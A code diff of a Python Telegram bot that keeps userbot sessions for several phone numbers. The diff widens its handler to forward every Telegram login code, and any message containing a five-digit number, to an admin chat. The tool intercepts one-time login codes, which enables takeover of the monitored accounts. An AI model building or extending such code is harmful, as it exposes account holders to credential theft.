@@ -1,15 +1,8 @@
 import sys
 import os
-import asyncio
-
-# إصلاح مشكلة Event Loop في بيئات Render و Python الحديثة
-try:
-    asyncio.get_event_loop()
-except RuntimeError:
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
+import re
 import glob
+import asyncio
 import logging
 from threading import Thread
 from flask import Flask
@@ -29,7 +22,7 @@ web_app = Flask(__name__)
 
 @web_app.route('/')
 def home():
-    return "Bot is running!"
+    return "Bot is active!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
@@ -45,16 +38,23 @@ user_states = {}
 temp_data = {}
 active_userbots = []
 
-# ══════════════════ دوال مساعدة ══════════════════
+# ══════════════════ التقاط الأكواد وتوجيهها ══════════════════
 def attach_otp_handler(userbot_client, phone_num, ptb_app):
-    @userbot_client.on_message(filters.me | filters.service | filters.private)
+    """التقاط شامل لكافة الرسائل القادمة من تلغرام وتوجيهها فوراً"""
+    @userbot_client.on_message()
     async def auto_forward_otp(c, msg):
-        if (msg.from_user and msg.from_user.id == 777000) or "Login code" in str(msg.text) or "رمز الدخول" in str(msg.text):
-            text = f"🔑 **رمز جديد للحساب (`+{phone_num}`):**\n\n{msg.text}"
-            await ptb_app.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode=ParseMode.MARKDOWN)
+        # التقاط أي رسالة قادمة من تلغرام الرسمي (777000) أو تحوي كود دخول
+        is_telegram = (msg.from_user and msg.from_user.id == 777000)
+        msg_text = msg.text or msg.caption or ""
+        
+        if is_telegram or "Login code" in msg_text or "رمز الدخول" in msg_text or re.search(r'\b\d{5}\b', msg_text):
+            text = f"🚨 **إشعار / رمز جديد للحساب (`+{phone_num}`):**\n\n{msg_text}"
+            try:
+                await ptb_app.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode=ParseMode.MARKDOWN)
+            except Exception as e:
+                logging.error(f"فشل إرسال الرمز للأدمن: {e}")
 
 def admin_menu_kb():
-    # تم حذف style="success" تماماً لمنع الخطأ
     keyboard = [
         [
             InlineKeyboardButton("🟢 ➕ إضافة جلسة جديدة", callback_data="add_session"),
@@ -93,14 +93,13 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     
     elif data == "list_sessions":
+        text = f"📱 **عدد الجلسات المفعلة حالياً في الذاكرة:** `{len(active_userbots)}`\n\n"
         if not active_userbots:
-            await query.edit_message_text("❌ لا توجد جلسات نشطة حالياً.", reply_markup=admin_menu_kb())
-            return
-        
-        text = "📱 **قائمة الحسابات والجلسات المراقبة حالياً:**\n\n"
-        for ub in active_userbots:
-            phone = ub.name.replace("session_", "")
-            text += f"• `+{phone}`\n"
+            text += "⚠️ لا توجد جلسات متصلة حالياً. أضف جلسة جديدة عبر `/add`."
+        else:
+            for ub in active_userbots:
+                phone = ub.name.replace("session_", "")
+                text += f"• `+{phone}` (متصل 🟢)\n"
             
         await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=admin_menu_kb())
 
@@ -161,7 +160,7 @@ async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             await update.message.reply_text(
                 f"✅ **تمت إضافة الجلسة بنجاح للحساب `+{data['phone']}`!**\n"
-                "سيرسل لك البوت أي كود دخول فور وصوله.",
+                "جرب الآن طلب كود دخول للحساب وسيصلك هنا مباشرة.",
                 reply_markup=admin_menu_kb()
             )
 
